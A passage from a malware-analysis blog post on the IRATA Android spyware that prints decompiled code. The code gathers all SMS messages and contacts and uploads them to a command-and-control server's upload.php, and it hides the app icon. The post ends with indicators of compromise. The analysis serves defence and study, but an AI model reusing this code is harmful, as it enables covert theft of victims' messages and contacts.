                <span class="n">_sms</span> <span class="p">=</span> <span class="p">(</span><span class="n">SmsWrapper</span><span class="p">.</span><span class="n">Sms</span><span class="p">)</span> <span class="n">_li</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
                <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">str5</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"{"</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"@The_Mammadw"</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"Conversion:"</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">_sms</span><span class="p">.</span><span class="n">Address</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"Text:"</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">_sms</span><span class="p">.</span><span class="n">Body</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"Date:"</span><span class="p">);</span>
                <span class="n">DateTime</span> <span class="n">dateTime</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">DateTime</span><span class="p">;</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">DateTime</span><span class="p">.</span><span class="nf">Date</span><span class="p">(</span><span class="n">_sms</span><span class="p">.</span><span class="n">Date</span><span class="p">));</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">" "</span><span class="p">);</span>
                <span class="n">DateTime</span> <span class="n">dateTime2</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">DateTime</span><span class="p">;</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">DateTime</span><span class="p">.</span><span class="nf">Time</span><span class="p">(</span><span class="n">_sms</span><span class="p">.</span><span class="n">Date</span><span class="p">));</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span><span class="p">);</span>
                <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">"}"</span><span class="p">);</span>
                <span class="n">str5</span> <span class="p">=</span> <span class="n">sb</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="n">File</span> <span class="n">file</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">File</span><span class="p">;</span>
            <span class="n">File</span> <span class="n">file2</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">File</span><span class="p">;</span>
            <span class="n">File</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="nf">getDirInternal</span><span class="p">(),</span> <span class="s">"AllSms.txt"</span><span class="p">,</span> <span class="n">str5</span><span class="p">);</span>
            <span class="n">File</span> <span class="n">file3</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">File</span><span class="p">;</span>
            <span class="n">_ht</span><span class="p">.</span><span class="nf">_postfile</span><span class="p">(</span><span class="n">_port1</span> <span class="p">+</span> <span class="s">"/upload.php?result=ok&amp;action=upload&amp;androidid="</span> <span class="p">+</span> <span class="n">_android</span> <span class="p">+</span> <span class="s">"&amp;opr="</span> <span class="p">+</span> <span class="n">_opr</span> <span class="p">+</span> <span class="s">"&amp;model="</span> <span class="p">+</span> <span class="n">_model</span><span class="p">,</span> <span class="n">File</span><span class="p">.</span><span class="nf">getDirInternal</span><span class="p">(),</span> <span class="s">"AllSms.txt"</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>Then the malware send the command <code class="language-plaintext highlighter-rouge">getcontact</code> to get all contacts of the victim to make new victims. After the malware gets contacts, the malware will send spam SMS to the contacts to lure victims.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span><span class="n">_comand</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="s">"getcontact"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">_android</span><span class="p">.</span><span class="k">equals</span><span class="p">(</span><span class="n">_androidid</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">Common</span><span class="p">.</span><span class="nf">LogImpl</span><span class="p">(</span><span class="s">"83473516"</span><span class="p">,</span> <span class="s">"contact is OK"</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
            <span class="n">contactsutils</span> <span class="n">contactsutilsVar</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">contactsutils</span><span class="p">();</span>
            <span class="n">contactsutilsVar</span><span class="p">.</span><span class="nf">_initialize</span><span class="p">(</span><span class="n">processBA</span><span class="p">);</span>
            <span class="n">List</span> <span class="n">_findcontactsbyphone</span> <span class="p">=</span> <span class="n">contactsutilsVar</span><span class="p">.</span><span class="nf">_findcontactsbyphone</span><span class="p">(</span><span class="s">""</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="kt">int</span> <span class="n">size2</span> <span class="p">=</span> <span class="n">_findcontactsbyphone</span><span class="p">.</span><span class="nf">getSize</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">str6</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i2</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i2</span> <span class="p">&lt;</span> <span class="n">size2</span><span class="p">;</span> <span class="n">i2</span><span class="p">++)</span> <span class="p">{</span>
                <span class="n">List</span> <span class="n">_getphones</span> <span class="p">=</span> <span class="n">contactsutilsVar</span><span class="p">.</span><span class="nf">_getphones</span><span class="p">(((</span><span class="n">contactsutils</span><span class="p">.</span><span class="n">_cucontact</span><span class="p">)</span> <span class="n">_findcontactsbyphone</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="n">i2</span><span class="p">)).</span><span class="n">Id</span><span class="p">);</span>
                <span class="kt">int</span> <span class="n">size3</span> <span class="p">=</span> <span class="n">_getphones</span><span class="p">.</span><span class="nf">getSize</span><span class="p">();</span>
                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i3</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i3</span> <span class="p">&lt;</span> <span class="n">size3</span><span class="p">;</span> <span class="n">i3</span><span class="p">++)</span> <span class="p">{</span>
                    <span class="n">contactsutils</span><span class="p">.</span><span class="n">_cuphone</span> <span class="n">_cuphoneVar</span> <span class="p">=</span> <span class="p">(</span><span class="n">contactsutils</span><span class="p">.</span><span class="n">_cuphone</span><span class="p">)</span> <span class="n">_getphones</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="n">i3</span><span class="p">);</span>
                    <span class="n">str6</span> <span class="p">=</span> <span class="n">str6</span> <span class="p">+</span> <span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span> <span class="p">+</span> <span class="s">"@The_Mammadw"</span> <span class="p">+</span> <span class="n">Common</span><span class="p">.</span><span class="n">CRLF</span> <span class="p">+</span> <span class="n">_cucontactVar</span><span class="p">.</span><span class="n">DisplayName</span> <span class="p">+</span> <span class="s">": "</span> <span class="p">+</span> <span class="n">_cuphoneVar</span><span class="p">.</span><span class="n">Number</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="n">File</span> <span class="n">file4</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">File</span><span class="p">;</span>
            <span class="n">File</span> <span class="n">file5</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">File</span><span class="p">;</span>
            <span class="n">File</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="nf">getDirInternal</span><span class="p">(),</span> <span class="s">"Contacts.txt"</span><span class="p">,</span> <span class="n">str6</span><span class="p">);</span>
            <span class="n">File</span> <span class="n">file6</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">File</span><span class="p">;</span>
            <span class="n">_ht</span><span class="p">.</span><span class="nf">_postfile</span><span class="p">(</span><span class="n">_port1</span> <span class="p">+</span> <span class="s">"/upload.php?result=ok&amp;action=upload1&amp;androidid="</span> <span class="p">+</span> <span class="n">_android</span> <span class="p">+</span> <span class="s">"&amp;opr="</span> <span class="p">+</span> <span class="n">_opr</span> <span class="p">+</span> <span class="s">"&amp;model="</span> <span class="p">+</span> <span class="n">_model</span><span class="p">,</span> <span class="n">File</span><span class="p">.</span><span class="nf">getDirInternal</span><span class="p">(),</span> <span class="s">"Contacts.txt"</span><span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>The malware will try to maintain presistance to the victim’s phone. So the victim won’t suspect about the installed APK. So the malware will hide the icon of the malicious APK.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">_hideapp</span><span class="p">(</span><span class="n">boolean</span> <span class="n">z</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>
        <span class="n">Reflection</span> <span class="n">reflection</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Reflection</span><span class="p">();</span>
        <span class="n">B4AApplication</span> <span class="n">b4AApplication</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">Application</span><span class="p">;</span>
        <span class="n">String</span> <span class="n">packageName</span> <span class="p">=</span> <span class="n">B4AApplication</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">();</span>
        <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>
        <span class="n">B4AApplication</span> <span class="n">b4AApplication2</span> <span class="p">=</span> <span class="n">Common</span><span class="p">.</span><span class="n">Application</span><span class="p">;</span>
        <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">B4AApplication</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">());</span>
        <span class="n">sb</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="s">".main"</span><span class="p">);</span>
        <span class="n">Object</span> <span class="n">CreateObject2</span> <span class="p">=</span> <span class="n">reflection</span><span class="p">.</span><span class="nf">CreateObject2</span><span class="p">(</span><span class="s">"android.content.ComponentName"</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">packageName</span><span class="p">,</span> <span class="n">sb</span><span class="p">.</span><span class="nf">toString</span><span class="p">()},</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"java.lang.String"</span><span class="p">,</span> <span class="s">"java.lang.String"</span><span class="p">});</span>
        <span class="n">reflection</span><span class="p">.</span><span class="n">Target</span> <span class="p">=</span> <span class="n">reflection</span><span class="p">.</span><span class="nf">GetContext</span><span class="p">(</span><span class="n">processBA</span><span class="p">);</span>
        <span class="n">reflection</span><span class="p">.</span><span class="n">Target</span> <span class="p">=</span> <span class="n">reflection</span><span class="p">.</span><span class="nf">RunMethod</span><span class="p">(</span><span class="s">"getPackageManager"</span><span class="p">);</span>
        <span class="n">reflection</span><span class="p">.</span><span class="n">Target</span> <span class="p">=</span> <span class="n">reflection</span><span class="p">.</span><span class="nf">RunMethod4</span><span class="p">(</span><span class="s">"setComponentEnabledSetting"</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">CreateObject2</span><span class="p">,</span> <span class="n">Integer</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">z</span> <span class="p">?</span> <span class="m">2</span> <span class="p">:</span> <span class="m">1</span><span class="p">),</span> <span class="m">0</span><span class="p">},</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"android.content.ComponentName"</span><span class="p">,</span> <span class="s">"java.lang.int"</span><span class="p">,</span> <span class="s">"java.lang.int"</span><span class="p">});</span>
        <span class="k">return</span> <span class="s">""</span><span class="p">;</span>
    <span class="p">}</span>

</code></pre></div></div>

<h1 id="dynamic-analysis">Dynamic analysis</h1>

<p>Now we will try to run the malicious APK on android emulator using <code class="language-plaintext highlighter-rouge">Android studio</code> and intercept the http/s using <code class="language-plaintext highlighter-rouge">Burp Suite</code>. After installing the malware.</p>

<p align="center">
  <img src="/assets/images/MA/irata/4.gif" />
</p>
<center><font size="3"> <u>Figure</u>(4) <u></u> </font></center>
<p><br /></p>

<h1 id="ioc">IoC</h1>

<table>
  <thead>
    <tr>
      <th style="text-align: left">No.</th>
      <th>Description</th>
      <th>Hash and URLs</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">1</td>
      <td>The APK hash (MD5)</td>
      <td>ce41d55ee66d509e1e2043d9e238f65a</td>
    </tr>
    <tr>
      <td style="text-align: left">2</td>
      <td>C2 server</td>
      <td>hxxp:///usenlghusk.gq/USK/rat.php</td>
    </tr>
    <tr>
      <td style="text-align: left">3</td>
      <td>C2 Server</td>
      <td>hxxp://usenlghusk.gq/USK</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<h1 id="article-quote">Article Quote</h1>

<blockquote>
  <p>يا سالكين إليه الدرب لا تقِفوا .. طابَ الوصول لمحرومـٍ تمنّاهُ</p>
</blockquote>

<h1 id="ref">REF</h1>

<p>1- <a href="https://onecert.ir/portal/blog/irata">IRATA</a></p>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware-analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-08-26T00:00:00+00:00">August 26, 2022</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Technical+analysis+of+IRATA+android+malware%20https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Firata%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Firata%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Firata%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/mal-document/lokibotpdf/" class="pagination--pager" title="PDF Analysis of Lokibot malware
">Previous</a>
    
    
      <a href="/malware-analysis/sova/" class="pagination--pager" title="Technical analysis of SOVA android malware
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Muhammad Hasan Ali. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-9P532HWLYQ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-9P532HWLYQ');
</script>








  </body>
</html>
